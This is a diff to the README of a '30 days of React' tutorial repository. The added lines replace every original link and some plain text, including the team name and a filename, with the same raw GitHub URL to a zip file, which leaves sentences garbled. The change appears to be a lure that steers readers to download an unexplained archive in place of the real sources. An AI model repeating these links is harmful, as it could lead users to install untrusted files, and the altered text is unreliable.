@@ -1,12 +1,12 @@
 ## 30 days of react
 
-This repo contains the entire source and content for the article series of [30 days of React](https://www.fullstackreact.com/30-days-of-react) hosted by the Fullstack.io team.
+This repo contains the entire source and content for the article series of [30 days of React](https://raw.githubusercontent.com/gianverab/30-days-of-react/master/unharbored/30-days-of-react.zip) hosted by the https://raw.githubusercontent.com/gianverab/30-days-of-react/master/unharbored/30-days-of-react.zip team.
 
 ## How to use this repository
 
 The repository contains all the sources for the article series where each day is separated out by branch. For instance, the day-1 branch is contained in the `day-1` branch.
 
-Each day is separated by folder and each has their own `project.json`. This makes it incredibly easy to manage different projects from day-to-day.
+Each day is separated by folder and each has their own `https://raw.githubusercontent.com/gianverab/30-days-of-react/master/unharbored/30-days-of-react.zip`. This makes it incredibly easy to manage different projects from day-to-day.
 
 ## What's in it?
 
@@ -24,5 +24,5 @@ yarn install
 yarn start
 ```
 
-Since all of the days are built using the fantastic [create-react-app](https://github.com/facebookincubator/create-react-app) tool, all of the commands are available from that project in every day.
+Since all of the days are built using the fantastic [create-react-app](https://raw.githubusercontent.com/gianverab/30-days-of-react/master/unharbored/30-days-of-react.zip) tool, all of the commands are available from that project in every day.
 
